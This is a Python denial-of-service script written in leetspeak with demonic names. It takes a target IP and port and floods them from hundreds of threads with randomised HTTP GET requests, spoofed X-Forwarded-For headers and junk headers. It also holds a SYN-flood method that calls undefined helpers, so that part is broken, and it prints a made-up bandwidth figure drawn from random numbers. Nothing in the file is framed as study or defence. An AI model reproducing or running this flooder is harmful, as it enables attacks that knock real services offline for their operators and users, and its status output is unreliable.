#!/usr/bin/env python3
# [UNR34L CH40S 3NG1N3]

import socket
import random
import threading
import time
import sys
from concurrent.futures import ThreadPoolExecutor

class D3V1L_B34ST:
    def __init__(self, target_ip, target_port=80, threads=500):
        self.target = target_ip
        self.port = target_port
        self.thread_count = threads
        self.socket_army = []
        self.running = False
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
        ]
    
    def craft_packet(self):
        """C4LV4R14N P4CK3T F0RG3RY"""
        payload = f"GET /{random.randint(1, 9999)} HTTP/1.1\r\n"
        payload += f"Host: {self.target}\r\n"
        payload += f"User-Agent: {random.choice(self.user_agents)}\r\n"
        payload += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        payload += "Accept-Language: en-US,en;q=0.5\r\n"
        payload += "Accept-Encoding: gzip, deflate\r\n"
        payload += f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
        payload += "Connection: keep-alive\r\n"
        payload += "\r\n"
        return payload.encode('utf-8')
    
    def satan_thread(self):
        """D34TH WH1SP3R THR34D"""
        while self.running:
            try:
                # 5P4WN Z0MB13 S0CK3T5
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((self.target, self.port))
                
                # 1NF1N1T3 F1R3 L00P
                for _ in range(1000):
                    if not self.running:
                        break
                    sock.send(self.craft_packet())
                    sock.send(b"X-Dead: 0xDEADBEEF\r\n" * random.randint(10, 50))
                
                sock.close()
            except:
                pass
            time.sleep(0.01)
    
    def unleash_hell(self):
        """4CT1V4T3 4P0C4LYPS3"""
        print(f"[+] T4RG3T L0CK3D: {self.target}:{self.port}")
        print(f"[+] D34TH THR34D5: {self.thread_count}")
        print("[+] 3V0K1NG CH40S...")
        
        self.running = True
        threads = []
        
        with ThreadPoolExecutor(max_workers=self.thread_count) as executor:
            for _ in range(self.thread_count):
                threads.append(executor.submit(self.satan_thread))
        
        # M41NT41N TH3 P41N
        try:
            while True:
                print(f"[+] 4CT1V3 Z0MB13S: {threading.active_count()}")
                print(f"[+] B4NDW1DTH C0N5UM3D: {random.randint(100, 999)} Gbps")
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False
            print("\n[!] H3LLF1R3 3XT1N6U15H3D")
    
    def syn_flood(self):
        """5YN CH40S V0RT3X"""
        ip_header = self.random_ip_header()
        tcp_header = self.craft_tcp_header()
        packet = ip_header + tcp_header
        
        # 5P4WN 5YN P4CK3T H0RD3
        while self.running:
            try:
                raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                raw_socket.sendto(packet, (self.target, self.port))
            except:
                pass

# M41N 4P0C4LYPS3 TR1GG3R
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 d34th_ray.py <target_ip> [port] [threads]")
        sys.exit(1)
    
    target = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    threads = int(sys.argv[3]) if len(sys.argv) > 3 else 666
    
    beast = D3V1L_B34ST(target, port, threads)
    beast.unleash_hell()